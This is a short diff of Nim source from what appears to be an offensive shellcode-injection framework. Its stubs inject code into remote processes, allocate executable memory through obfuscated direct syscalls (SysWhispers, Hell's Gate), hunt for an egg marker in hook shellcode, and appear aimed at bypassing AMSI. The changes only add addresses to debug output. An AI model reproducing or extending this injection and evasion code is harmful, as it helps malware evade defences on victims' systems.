@@ -511,7 +511,7 @@ let ShellcoderemoteinjectStub * = """
 
                 when defined(verbose):
                     echo obf("-------------------------------------------------------------")
-                    echo obf("[*] Looking for the egg, which will be filled with the first shellcodes memory address")
+                    echo obf("[*] Looking for the egg, which will be filled with the first shellcodes memory address"), repr(ds)
 
                 for i in 0 ..< hookShellcodeBytes.len:
                     if (hookShellcodeBytes[i] == 0x88) and (hookShellcodeBytes[i+1] == 0x88) and (hookShellcodeBytes[i+2] == 0x88) and (hookShellcodeBytes[i+3] == 0x88) and (hookShellcodeBytes[i+4] == 0x88) and (hookShellcodeBytes[i+5] == 0x88):
@@ -1026,7 +1026,7 @@ let RemoteLoadAMSIStub* = """
 
             status = oqiahsjynmxkla(tProcess, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
             when defined(verbose):
-                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
+                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status), " ", toHex(ds)
             var bytesWritten: SIZE_T
 
             status = oqiazasusjk(tProcess,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)
@@ -1069,7 +1069,7 @@ let RemoteLoadAMSIStub* = """
                 MEM_COMMIT, 
                 PAGE_READWRITE)
             when defined(verbose):
-                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
+                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status), " ", toHex(ds)
             var bytesWritten: SIZE_T
 
             when defined(Hellsgate):
@@ -1336,7 +1336,7 @@ let RemoteForceSleepStub* = """
         when defined(SysWhispers):
             status = oqiahsjynmxkla(targetProcess, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
             when defined(verbose):
-                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
+                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status), " ", toHex(ds)
             var bytesWritten: SIZE_T
 
             status = oqiazasusjk(targetProcess,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)
@@ -1366,7 +1366,7 @@ let RemoteForceSleepStub* = """
                 MEM_COMMIT, 
                 PAGE_READWRITE)
             when defined(verbose):
-                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
+                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status), " ", toHex(ds)
             var bytesWritten: SIZE_T
 
             when defined(Hellsgate):
